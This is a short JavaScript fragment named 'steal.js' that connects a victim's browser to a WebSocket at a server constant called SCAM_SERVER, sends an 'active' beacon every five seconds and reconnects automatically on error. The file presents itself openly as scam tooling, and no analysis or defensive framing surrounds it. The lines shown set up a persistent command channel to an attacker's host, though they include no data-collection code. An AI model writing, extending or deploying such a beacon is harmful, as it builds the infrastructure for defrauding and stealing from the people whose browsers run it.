console.log("steal.js loaded! Connecting to WebSocket...");

// ✅ WebSocket setup with auto-reconnect
let socket = new WebSocket(SCAM_SERVER);

socket.onopen = () => {
    console.log("✅ WebSocket connected successfully!");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
};

socket.onerror = (error) => {
    console.error("❌ WebSocket Error:", error);
    setTimeout(reconnectWebSocket, 5000);  // Try reconnecting in 5 seconds
};

function reconnectWebSocket() {
    console.log("🔄 Reconnecting WebSocket...");
    socket = new WebSocket(SCAM_SERVER);
}
